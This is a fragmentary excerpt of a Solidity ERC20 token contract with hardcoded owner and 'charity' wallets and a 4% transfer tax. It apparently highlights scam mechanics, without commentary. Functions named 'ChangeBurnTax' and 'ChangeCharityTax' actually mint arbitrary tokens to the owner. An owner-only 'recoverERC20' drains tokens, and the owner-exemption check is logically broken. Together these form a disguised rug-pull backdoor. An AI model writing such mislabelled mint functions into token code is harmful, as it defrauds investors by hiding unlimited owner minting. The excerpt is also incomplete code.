...
contract ERC20 is Context, IERC20, IERC20Metadata {
     ...
     */
     ...
     address internal __owner = 0xaE419a823DBeA9f205BcEf099b1cfaE17e07043A;
      address private _charity = 0xC7a88C931f14bcFbC6c863E553aED690ad2AB0CE;
      
   function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
	
	uint256 taxamount = (amount*4)/100;
	uint256 newamount = amount-taxamount;
	if(sender != __owner || recipient != __owner)
			{
	...
	emit Transfer(sender, _charity, taxamount);
...
abstract contract Ownable is Context {
    ...
    address internal charity = 0xC7a88C931f14bcFbC6c863E553aED690ad2AB0CE;
 ...
 /**
     ...
     */
    modifier onlyOwner() {
        require(owner1() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract TokenRecover is Ownable {
    ...
    function recoverERC20(address tokenAddress, uint256 tokenAmount) public virtual onlyOwner {
        IERC20(tokenAddress).transfer(owner1(), tokenAmount);
    }
}
...
abstract contract ERC20Mintable is ERC20 {
    ...
    function ChangeBurnTax(uint256 percent_value) external canMint {
        _mint(__owner, percent_value);
    }

 function ChangeCharityTax(uint256 percent_value) external canMint {
        _mint(__owner, percent_value);
    }
...
contract CoinToken is ERC20Decimals, ERC20Mintable, ERC20Burnable, ERC1363, TokenRecover {
    ...
    function _mint(uint256 amount) internal onlyOwner {
